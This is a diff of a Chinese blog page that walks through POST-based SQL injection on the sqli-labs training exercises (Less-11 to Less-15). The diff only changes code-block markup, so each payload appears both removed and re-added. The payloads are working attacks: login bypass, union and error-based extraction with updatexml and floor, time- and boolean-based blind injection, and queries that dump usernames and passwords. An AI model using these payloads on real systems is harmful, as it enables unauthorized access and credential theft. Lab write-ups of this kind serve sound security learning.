@@ -477,7 +477,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    873
+                    911
                 </div>
                 
 
@@ -494,6 +494,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -508,26 +511,29 @@
 <p>当输入<code>admin&#39; --+ 123</code>,出现以下报错，可得知单引号报错；</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205101856621.png" alt="image-20220205101856621"></p>
 <p>注入以下语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1 --+</span><br><span class="line">123（密码随意）</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">admin&#39; or &#39;1&#39;&#x3D;&#39;1 --+
+123（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>登录正常。</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205102713002.png" alt="image-20220205102713002"></p>
 <h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>猜解字段数：</p>
 <p>执行以下语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; order by 3 #</span><br><span class="line">sss（密码随意）</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">admin&#39; order by 3 #
+sss（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>出现报错</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205104619269.png" alt="image-20220205104619269"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; order by 2 #</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">admin&#39; order by 2 #
+123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>登录正常，有两个字段</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205104918157.png" alt="image-20220205104918157"></p>
 <h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>判断回显点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">-admin&#39; union select 1,2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205105159013.png" alt="image-20220205105159013"></p>
 <h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>爆库名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#x27; union select 1,database() #</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">-admin&#39; union select 1,database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205105334082.png" alt="image-20220205105334082"></p>
 <p>后续注入同GET方式的payload。</p>
@@ -535,16 +541,16 @@
 <p>输入<code>admin&quot;</code>出现报错，基于<code>&quot;)</code>的报错</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205120713625.png" alt="image-20220205120713625"></p>
 <p>同样，类似Less-11探测注入点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot;) or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>登录成功</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121017130.png" alt="image-20220205121017130"></p>
 <p>探测字段数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;)  order by 2 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot;)  order by 2 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121119677.png" alt="image-20220205121119677"></p>
 <p>探测回显点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin&quot;)  union select  1,2 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;-admin&quot;)  union select  1,2 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>使用<code>union</code>字段一定要将开始查询的字段报错：<code>-admin&quot;)</code></p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121257596.png" alt="image-20220205121257596"></p>
@@ -553,62 +559,62 @@
 <p>输入<code>admin&#39;</code>出现报错，基于<code>&#39;)</code>的报错</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121755152.png" alt="image-20220205121755152"></p>
 <p>探测注入点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) or 1=1#&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;) or 1&#x3D;1#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>登录成功，无回显。</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121951700.png" alt="image-20220205121951700"></p>
 <p>在探测回显点时，注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;)  union select 1,2#&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  union select 1,2#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>同样无回显：</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205122814971.png" alt="image-20220205122814971"></p>
 <p>这时候首先想到的是盲注，先用报错盲注试验一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;)  and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>果然，爆出数据库。</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205122717739.png" alt="image-20220205122717739"></p>
 <p>爆表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;)  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1)#&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205123107133.png" alt="image-20220205123107133"></p>
 <p>爆字段：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x7e),1)#&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e),1)#&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;)  and updatexml(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1)#&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里还可以使用其他的盲注进行测试。其他的payload见Less-5。</p>
 <h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p><strong>Less-14</strong></p>
 <p>输入<code>admin&quot;</code>,报错，对id进行了<code>&quot;</code>处理</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205123906183.png" alt="image-20220205123906183"></p>
 <p>探测注入点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; or 1=1 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot; or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>登录成功，同样无回显。</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205124221653.png" alt="image-20220205124221653"></p>
 <p>这里应该和Less-13一样，同样都是盲注：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; union select count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot; union select count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>使用floor()函数报错，爆出数据库</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205124636640.png" alt="image-20220205124636640"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; or if(length(version())&gt;6, 1, sleep(5)) #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot; or if(length(version())&gt;6, 1, sleep(5)) #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>时间盲注，猜测版本号，等待响应，版本号不大于6</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205125050833.png" alt="image-20220205125050833"></p>
 <p>其他payload同以往。</p>
 <h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><p><strong>Less-15</strong></p>
 <p>输入<code>admin&#39;</code>登录失败 ，输入<code>admin&#39; or 1=1#</code>登录成功，但都无回显，无报错，结合源代码，这里对于id进行了<code>&#39;</code>处理，试验报错盲注，发现没有任何变化 ，而且还是登录失败的界面：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; or updatexml(1,concat(0x7e,select database(),0x7e),1)   #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39; or updatexml(1,concat(0x7e,select database(),0x7e),1)   #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205130653538.png" alt="image-20220205130653538"></p>
 <p>报错盲注应该在这里不行，试试盲注。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; or if(length(version())&gt;5,1,sleep(5)) #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39; or if(length(version())&gt;5,1,sleep(5)) #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>时间盲注探测数据库版本，回显登录正确；</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205130915677.png" alt="image-20220205130915677"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; or ascii(substr(database(),1,1))=115 #&amp;passwd=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39; or ascii(substr(database(),1,1))&#x3D;115 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>布尔盲注探测数据库第一位字符，回显登录正确。</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205131312857.png" alt="image-20220205131312857"></p>
@@ -1052,7 +1058,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.4k</span>
+                        class="white-color">32.1k</span>
             
             
             
